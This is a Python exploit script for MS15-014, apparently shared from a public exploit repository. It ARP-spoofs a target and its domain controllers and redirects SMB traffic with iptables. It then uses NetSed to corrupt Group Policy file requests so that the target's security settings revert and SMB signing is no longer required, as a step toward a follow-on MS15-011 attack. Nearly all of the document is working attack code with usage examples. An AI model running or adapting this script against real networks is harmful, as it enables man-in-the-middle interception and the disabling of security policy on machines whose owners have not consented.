#!/usr/bin/python3

import argparse
import fcntl
import os
import socket
import struct
import subprocess
from subprocess import PIPE
import re

# MS15-014 Exploit.
# For more information and any updates/additions this exploit see the following Git Repo: https://github.com/Freakazoidile/Exploit_Dev/tree/master/MS15-014
# Example usage: python3 ms15-014.py -t 172.66.10.2 -d 172.66.10.10 -i eth1
# Example usage with multiple DC's: python3 ms15-014.py -t 172.66.10.2 -d 172.66.10.10 -d 172.66.10.11 -d 172.66.10.12 -i eth1
# Questions @momika233 on twitter or make an issue on the GitHub repo. Enjoy.

def arpSpoof(interface, hostIP, targetIP):
    arpCmd = "arpspoof -i %s %s %s " % (interface, hostIP, targetIP)
    arpArgs = arpCmd.split()
    print("Arpspoofing: %s" % (arpArgs))
    p = subprocess.Popen(arpArgs, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)


def corrupt_packet():
    global count
    
    # NetSed listen port 446 (iptables redirected), modify traffic, then forward to destination 445.
    netsedCmd = "netsed tcp 446 0 445 s/%00%5c%00%4d%00%61%00%63%00%68%00%69%00%6e%00%65%00%5c%00%4d%00%69%00%63%00%72%00%6f%00%73%00%6f%00%66%00%74%00%5c%00%57%00%69%00%6e%00%64%00%6f%00%77%00%73%00%20%00%4e%00%54%00%5c%00%53%00%65%00%63%00%45%00%64%00%69%00%74%00%5c%00%47%00%70%00%74%00%54%00%6d%00%70%00%6c%00%2e%00%69%00%6e%00%66%00/%00%5c%00%4d%00%61%00%63%00%68%00%69%00%6e%00%65%00%5c%00%4d%00%69%00%63%00%72%00%6f%00%73%00%6f%00%66%00%74%00%5c%00%57%00%69%00%6e%00%64%00%6f%00%77%00%73%00%20%00%4e%00%54%00%5c%00%53%00%65%00%63%00%45%00%64%00%69%00%74%00%5c%00%47%00%70%00%74%00%54%00%6d%00%70%00%6c%00%2e%00%69%00%6e%00%66%00%00" #>/dev/null 2>&1 &
    netsedArgs = netsedCmd.split()
    print("Starting NetSed!")
    print("NetSed: %s" % (netsedArgs))
    netsedP = subprocess.Popen(netsedArgs, stdout=PIPE, stderr=subprocess.STDOUT)
    
    
    while True:
        o = (netsedP.stdout.readline()).decode('utf-8')
        
        if o != '':
            if args['verbose']:
                print("NetSed output: %s" % o)

            if re.search('Applying rule', o) is not None:
                count += 1
                print('packet corrupted: % s' % count)
                # During testing, after 4 attempts to retrieve GptTmpl.inf the exploit was successful. Sometimes the machine requested the file 7 times, but exploitation was always successful after 4 attempts.
                # The script waits for up to 7 for reliability. Tested on Windows 7 SP1 and Server 2012 R2
                if count == 4:
                    print("Exploit has likely completed!! waiting for up to 7 corrupted packets for reliability. \nIf no more packets are corrupted in the next couple of minutes kill this script. The target should be reverted to default settings with SMB signing not required on the client. \nTarget can now be exploited with MS15-011 exploit.")
                
        #During testing, after 7 attempts to retrieve GptTmpl.inf the GPO update stopped and exploitation was successful.
        if count == 7:
            break
    

def get_interface_address(ifname):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    return socket.inet_ntoa(fcntl.ioctl(s.fileno(), 0x8915, struct.pack('256s', bytes(ifname[:15], 'utf-8')))[20:24])

def iptables_config(targetIP, hostIP):
    #allow forwarding, redirect arpspoofed traffic from dport 445 to 446 for NetSed.
    print('[+] Running command: echo "1" > /proc/sys/net/ipv4/ip_forward')
    print('[+] Running command: iptables -t nat -A PREROUTING -p tcp --dport 445 -j REDIRECT --to-port 446')
    print('[+] Make sure to cleanup iptables after exploit completes')
    os.system('echo "1" > /proc/sys/net/ipv4/ip_forward')
    os.system('iptables -t nat -A PREROUTING -p tcp --dport 445 -j REDIRECT --to-port 446')

if __name__ == '__main__':

    parser = argparse.ArgumentParser(description='Find the SecEdit\GptTmpl.inf UUID to exploit MS15-014')
    parser.add_argument("-t", "--target_ip", help="The IP of the target machine vulnerable to ms15-014", required=True)
    parser.add_argument("-d", "--domain_controller", help="The IP of the domain controller in the target domain. Use this argument multiple times when multiple domain contollers are preset.\nE.G: -d 172.66.10.10 -d 172.66.10.11", action='append', required=True)
    parser.add_argument("-i", "--interface", help="The interface to use. E.G eth0", required=True)
    parser.add_argument("-v", "--verbose", help="Toggle verbose mode. displays all output of NetSed, very busy terminal if enabled.", action='store_true')

    args = vars(parser.parse_args())
    
    target_ip = args['target_ip']

    count = 0
    
    # Get the provided interfaces IP address
    ipAddr = get_interface_address(args['interface'])

    dcSpoof = ""
    dcCommaList = ""
    dcCount = 0
    
    # loop over the domain controllers, poison each and target the host IP
    # create a comma separated list of DC's
    # create a "-t" separate list of DC's for use with arpspoof
    for dc in args['domain_controller']:
        dcSpoof += "-t %s " % (dc)
        if dcCount > 0: 
            dcCommaList += ",%s" % (dc)
        else:
            dcCommaList += "%s" % (dc)

        arpSpoof(args['interface'], dc, "-t %s" % (target_ip))
        dcCount += 1

    # arpspoof the target and all of the DC's
    arpSpoof(args['interface'], target_ip, dcSpoof)

    # Setup iptables forwarding rules
    iptables_config(target_ip, ipAddr)

    #identify requests for GptTmpl.inf and modify the packet to corrupt it using NetSed.
    corrupt_packet()
